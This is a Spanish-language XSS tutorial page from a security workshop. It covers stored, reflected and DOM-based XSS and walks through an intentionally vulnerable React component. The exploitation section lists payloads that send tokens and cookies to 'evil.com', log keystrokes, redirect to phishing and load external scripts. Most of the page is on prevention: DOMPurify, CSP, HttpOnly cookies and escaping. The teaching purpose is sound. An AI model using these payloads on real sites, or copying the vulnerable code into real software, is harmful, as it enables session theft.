---
sidebar_position: 2
title: "Cross-Site Scripting (XSS)"
---

# Cross-Site Scripting (XSS)

## ¿Qué es XSS?

Cross-Site Scripting (XSS) es una de las vulnerabilidades web más comunes y peligrosas. Permite a un atacante inyectar código JavaScript malicioso en páginas web que serán ejecutadas en el navegador de otros usuarios. A diferencia de otros ataques que se dirigen directamente al servidor, XSS ataca a los usuarios de tu aplicación aprovechando la confianza que el navegador tiene en el contenido que recibe de tu sitio.

Cuando un usuario visita una página con código XSS inyectado, su navegador no puede distinguir entre el JavaScript legítimo de tu aplicación y el código malicioso del atacante. Ambos se ejecutan con los mismos privilegios, lo que significa que el atacante puede hacer todo lo que tu aplicación puede hacer: leer cookies, acceder a localStorage, hacer peticiones a tu API, modificar el DOM, e incluso redirigir al usuario a sitios de phishing.

### ¿Por qué es tan peligroso?

El impacto de XSS va mucho más allá de mostrar un simple `alert()`. Un ataque XSS exitoso puede:

1. **Robo de credenciales**: El atacante puede capturar cookies de sesión, tokens JWT almacenados en localStorage, o interceptar credenciales que el usuario escribe en formularios.

2. **Suplantación de identidad**: Con acceso al token de autenticación, el atacante puede realizar cualquier acción en nombre de la víctima: modificar su perfil, eliminar datos, enviar mensajes, o realizar transacciones.

3. **Distribución de malware**: El script inyectado puede redirigir a usuarios a sitios maliciosos o iniciar descargas automáticas de software malicioso.

4. **Keylogging**: El atacante puede registrar cada tecla que el usuario presiona en la página, capturando contraseñas, números de tarjeta de crédito, y otra información sensible.

5. **Defacement**: Modificar el contenido visible de la página para mostrar información falsa, propaganda, o dañar la reputación de la empresa.

6. **Criptominería**: Utilizar los recursos del navegador de la víctima para minar criptomonedas sin su conocimiento.

---

## Tipos de XSS

Existen tres tipos principales de XSS, cada uno con un vector de ataque diferente y diferentes niveles de persistencia:

### Stored XSS (Persistente)

El código malicioso se almacena permanentemente en el servidor (base de datos, sistema de archivos, etc.) y se entrega a todos los usuarios que acceden al recurso afectado.

```text
┌─────────────────────────────────────────────────────────────────────┐
│                        STORED XSS                                   │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. INYECCIÓN                                                       │
│     ┌─────────┐                           ┌─────────┐               │
│     │ Atacante│ ────POST /comments────►   │ Servidor│               │
│     └─────────┘                           └─────────┘               │
│                  Comentario:                    │                   │
│                  "<script>                      │                   │
│                    fetch('evil.com?c='+         │                   │
│                    document.cookie)             ▼                   │
│                  </script>"               ┌─────────┐               │
│                                           │   DB    │               │
│  2. ALMACENAMIENTO                        │ Guarda  │               │
│                                           │ script  │               │
│                                           └─────────┘               │
│                                                 │                   │
│  3. ENTREGA A VÍCTIMAS                          │                   │
│     ┌─────────┐                           ┌─────┴───┐               │
│     │ Víctima │ ◄────GET /comments────── │ Servidor│               │
│     │    A    │   HTML con <script>      └─────────┘               │
│     └─────────┘                                 │                   │
│          │                                      │                   │
│     ┌─────────┐                                 │                   │
│     │ Víctima │ ◄───────────────────────────────┘                   │
│     │    B    │   Mismo script malicioso                            │
│     └─────────┘                                                     │
│          │                                                          │
│  4. TODOS LOS VISITANTES EJECUTAN EL SCRIPT                         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

**Escenarios típicos de Stored XSS:**
- Comentarios en blogs o foros
- Perfiles de usuario (nombre, biografía)
- Mensajes privados
- Descripciones de productos
- Cualquier campo que se guarde y se muestre a otros usuarios

### Reflected XSS (No persistente)

El código malicioso se incluye en la URL o en los parámetros de una petición y se "refleja" inmediatamente en la respuesta del servidor. El ataque requiere que la víctima haga clic en un enlace malicioso.

```text
┌─────────────────────────────────────────────────────────────────────┐
│                        REFLECTED XSS                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. El atacante crea una URL maliciosa:                             │
│     https://sitio.com/search?q=<script>evil()</script>              │
│                                                                     │
│  2. La envía a la víctima (email, mensaje, redes sociales)          │
│                                                                     │
│  3. La víctima hace clic                                            │
│     ┌─────────┐                           ┌─────────┐               │
│     │ Víctima │ ────GET /search?q=...──►  │ Servidor│               │
│     └─────────┘                           └─────────┘               │
│                                                 │                   │
│  4. El servidor incluye el parámetro en la respuesta                │
│                                                 │                   │
│     ┌─────────┐                           ┌─────┴───┐               │
│     │ Víctima │ ◄────HTML con <script>─── │ Servidor│               │
│     └─────────┘   "Resultados para:       └─────────┘               │
│          │        <script>evil()</script>"                          │
│          │                                                          │
│  5. El navegador ejecuta el script                                  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

**Escenarios típicos de Reflected XSS:**
- Páginas de búsqueda que muestran "Resultados para: [término]"
- Mensajes de error que incluyen el input del usuario
- Páginas de login con mensajes como "Usuario [nombre] no encontrado"
- Cualquier página que muestre datos de la URL

### DOM-based XSS

El código malicioso nunca pasa por el servidor. La vulnerabilidad existe completamente en el JavaScript del cliente, que toma datos de una fuente controlable por el atacante (URL, localStorage, etc.) y los usa de forma insegura.

```text
┌─────────────────────────────────────────────────────────────────────┐
│                        DOM-BASED XSS                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. URL maliciosa:                                                  │
│     https://sitio.com/page#<img src=x onerror=evil()>               │
│                                                                     │
│  2. El servidor NO procesa el fragmento (después del #)             │
│     Solo devuelve la página HTML normal                             │
│                                                                     │
│  3. El JavaScript de la página lee el hash:                         │
│                                                                     │
│     // Código vulnerable en la página                               │
│     const hash = location.hash.substring(1);                        │
│     document.getElementById('content').innerHTML = hash;            │
│     // ❌ Inyecta el payload directamente en el DOM                 │
│                                                                     │
│  4. El navegador ejecuta el script inyectado                        │
│                                                                     │
│  NOTA: El servidor nunca vio el payload malicioso                   │
│        WAFs y logs del servidor no detectan el ataque               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

**Escenarios típicos de DOM-based XSS:**
- Código que lee `location.hash` o `location.search`
- Uso de `innerHTML` con datos del DOM
- Evaluación de parámetros de URL con `eval()` o `Function()`
- Frameworks que bindean datos sin sanitizar

---

## Ejemplo Real: Vulnerabilidad en Taller-Testing-Security

El proyecto **Taller-Testing-Security** incluye un componente intencionalmente vulnerable para demostración educativa. Veamos el código en detalle:

### El código vulnerable

```tsx
// ui/src/components/routes/Admin.tsx

import { ChangeEvent, useState } from "react";
import { EvilDiv } from "./Admin.styled";

export const Admin = () => {
  // Estado que almacena el input del usuario
  const [evilInput, setEvilInput] = useState("");

  // Handler que actualiza el estado con cada cambio
  function onChangeEvilInput(e: ChangeEvent<HTMLInputElement>) {
    setEvilInput(e.target.value);
  }

  return (
    <div>
      <h1>Panel de Administración</h1>
      <p>Introduce una URL de imagen para previsualizarla:</p>
      
      {/* Campo de entrada para URL */}
      <input 
        type="text" 
        onChange={onChangeEvilInput} 
        placeholder="https://ejemplo.com/imagen.png"
        style={{ width: '400px', padding: '8px' }}
      />
      
      {/* ❌ VULNERABLE: dangerouslySetInnerHTML con input sin sanitizar */}
      <EvilDiv
        dangerouslySetInnerHTML={{
          __html: `<img style="width: 200px;" src="${evilInput}"/>`,
        }}
      />
    </div>
  );
};
```

### Análisis de la vulnerabilidad

El problema está en la línea que usa `dangerouslySetInnerHTML`:

```tsx
__html: `<img style="width: 200px;" src="${evilInput}"/>`
```

Aquí, el valor de `evilInput` se interpola directamente dentro de un string que luego se interpreta como HTML. Esto significa que el atacante puede "romper" la sintaxis del tag `<img>` e inyectar sus propios atributos o tags.

### Explotación paso a paso

**Paso 1: Input normal**

Si el usuario introduce una URL válida como `https://vitejs.dev/logo.png`:

```html
<!-- HTML resultante -->
<img style="width: 200px;" src="https://vitejs.dev/logo.png"/>
```

La imagen se muestra correctamente. Todo funciona como esperado.

**Paso 2: Input malicioso**

Si el atacante introduce:
```
x" onerror="alert('XSS!')
```

El HTML resultante es:
```html
<img style="width: 200px;" src="x" onerror="alert('XSS!')"/>
```

El navegador intenta cargar la imagen `x`, falla porque no es una URL válida, y ejecuta el handler `onerror` con el código del atacante.

**Paso 3: Payload real de ataque**

Un atacante real usaría un payload más sofisticado:

```javascript
x" onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('token'))
```

HTML resultante:
```html
<img style="width: 200px;" src="x" onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('token'))"/>
```

Esto envía el token JWT del usuario al servidor del atacante.

### Variantes del payload

Hay múltiples formas de explotar esta vulnerabilidad:

```javascript
// Robar cookies
x" onerror="new Image().src='https://evil.com/?c='+document.cookie

// Keylogger
x" onerror="document.onkeypress=function(e){fetch('https://evil.com/log?k='+e.key)}

// Redirección a phishing
x" onerror="location='https://evil-phishing-site.com'

// Modificar el DOM
x" onerror="document.body.innerHTML='<h1>Sitio hackeado</h1>'

// Ejecutar script externo
x"><script src="https://evil.com/malware.js"></script><img src="x
```

---

## Prevención de XSS

### 1. Nunca usar `dangerouslySetInnerHTML` (cuando sea posible)

React escapa automáticamente todo el contenido que renderizas mediante JSX. Los caracteres especiales como `<`, `>`, `"`, `'`, `&` se convierten en entidades HTML inofensivas.

```tsx
// ❌ INSEGURO: dangerouslySetInnerHTML permite HTML sin escapar
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// ✅ SEGURO: React escapa automáticamente
<div>{userContent}</div>
```

Si el usuario intenta inyectar `<script>alert('XSS')</script>`, React lo convierte en texto plano:
```html
<div>&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
```

El navegador muestra literalmente `<script>alert('XSS')</script>` como texto, sin ejecutarlo.

### 2. Si necesitas HTML: Usa DOMPurify

A veces realmente necesitas renderizar HTML del usuario (editores WYSIWYG, contenido rich text, markdown convertido a HTML). En esos casos, **siempre** sanitiza primero:

```tsx
import DOMPurify from 'dompurify';

function SafeHTML({ html }: { html: string }) {
  // DOMPurify elimina todo lo peligroso:
  // - <script> tags
  // - Atributos on* (onclick, onerror, etc.)
  // - javascript: URLs
  // - data: URLs en ciertos contextos
  // - Y muchos otros vectores
  
  const sanitizedHTML = DOMPurify.sanitize(html, {
    // Solo permitir estos tags
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    // Solo permitir estos atributos
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    // Forzar links a abrirse en nueva pestaña con noopener
    ADD_ATTR: ['target', 'rel'],
  });
  
  return <div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />;
}

// Ejemplo de uso
<SafeHTML html={userComment} />
```

**Ejemplo de sanitización:**

```javascript
const maliciousHTML = `
  <p>Texto normal</p>
  <script>alert('XSS')</script>
  <img src="x" onerror="evil()">
  <a href="javascript:evil()">Click aquí</a>
`;

const clean = DOMPurify.sanitize(maliciousHTML, {
  ALLOWED_TAGS: ['p', 'a'],
  ALLOWED_ATTR: ['href']
});

// Resultado: '<p>Texto normal</p><a>Click aquí</a>'
// - <script> eliminado completamente
// - <img> eliminado (no está en ALLOWED_TAGS)
// - javascript: URL eliminada del href
```

### 3. Content Security Policy (CSP)

CSP es un header HTTP que le dice al navegador qué recursos puede cargar y ejecutar. Es tu última línea de defensa: incluso si hay una vulnerabilidad XSS, CSP puede prevenir la ejecución del script malicioso.

```typescript
// Configuración en Express con Helmet
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      // Solo cargar recursos de nuestro origen
      defaultSrc: ["'self'"],
      
      // Scripts: solo de nuestro origen, nada inline
      scriptSrc: ["'self'"],
      // ¡Sin 'unsafe-inline' ni 'unsafe-eval'!
      
      // Estilos: permitir inline para CSS-in-JS frameworks
      styleSrc: ["'self'", "'unsafe-inline'"],
      
      // Imágenes: nuestro origen + data URIs + HTTPS externo
      imgSrc: ["'self'", "data:", "https:"],
      
      // Conexiones API: nuestro origen + CDNs específicos
      connectSrc: ["'self'", "https://api.example.com"],
      
      // Frames: bloquear completamente
      frameAncestors: ["'none'"],
      
      // Formularios: solo a nuestro origen
      formAction: ["'self'"],
    },
  },
}));
```

**Cómo CSP bloquea XSS:**

```html
<!-- Si un atacante inyecta esto: -->
<script>alert('XSS')</script>

<!-- El navegador ve que es un inline script -->
<!-- CSP dice: scriptSrc: ["'self'"] (solo scripts de nuestro dominio) -->
<!-- Inline scripts no tienen origen = bloqueado -->

<!-- Mensaje en consola: -->
<!-- Refused to execute inline script because it violates the 
     Content-Security-Policy directive: "script-src 'self'" -->
```

### 4. Cookies HttpOnly

Protege los tokens de sesión para que no sean accesibles desde JavaScript:

```typescript
res.cookie('sessionToken', token, {
  httpOnly: true,  // No accesible via document.cookie
  secure: true,    // Solo enviar por HTTPS
  sameSite: 'strict',  // No enviar en requests cross-origin
  maxAge: 3600000  // Expiración en ms
});
```

Con `httpOnly: true`, incluso si un atacante logra ejecutar XSS, no puede robar la cookie de sesión:

```javascript
// Código del atacante (XSS)
document.cookie  // No incluye la cookie httpOnly
fetch('https://evil.com/?cookie=' + document.cookie);  // Cookie de sesión no enviada
```

### 5. Escapar según el contexto

Diferentes contextos requieren diferentes tipos de escape:

```typescript
// Contexto HTML: escapar < > & " '
const htmlEscape = (str: string) => str
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;')
  .replace(/'/g, '&#39;');

// Contexto atributo HTML: además, usar comillas dobles
<div title="${htmlEscape(userInput)}">

// Contexto JavaScript: usar JSON.stringify
<script>
  const userData = ${JSON.stringify(userData)};
</script>

// Contexto URL: usar encodeURIComponent
<a href="/search?q=${encodeURIComponent(searchTerm)}">

// Contexto CSS: evitar input de usuario en CSS, o sanitizar estrictamente
// ❌ Nunca: style="color: ${userInput}"
```

---

## Checklist de Prevención XSS

```text
□ No usar dangerouslySetInnerHTML excepto cuando sea absolutamente necesario
□ Si usas dangerouslySetInnerHTML, siempre sanitizar con DOMPurify primero
□ Configurar Content-Security-Policy sin 'unsafe-inline' en script-src
□ Usar cookies HttpOnly para tokens de sesión
□ Escapar output según el contexto (HTML, JavaScript, URL, CSS)
□ Validar y sanitizar input en el backend también
□ Usar frameworks que escapan por defecto (React, Vue, Angular)
□ Revisar código que usa innerHTML, document.write, eval, Function()
□ Configurar X-Content-Type-Options: nosniff
□ Auditar dependencias por vulnerabilidades XSS conocidas
```

---

## Próximo Paso

Ahora que entiendes XSS, continuemos con otra vulnerabilidad crítica que afecta a usuarios autenticados. Dirígete a **[Cross-Site Request Forgery (CSRF)](./csrf)**.
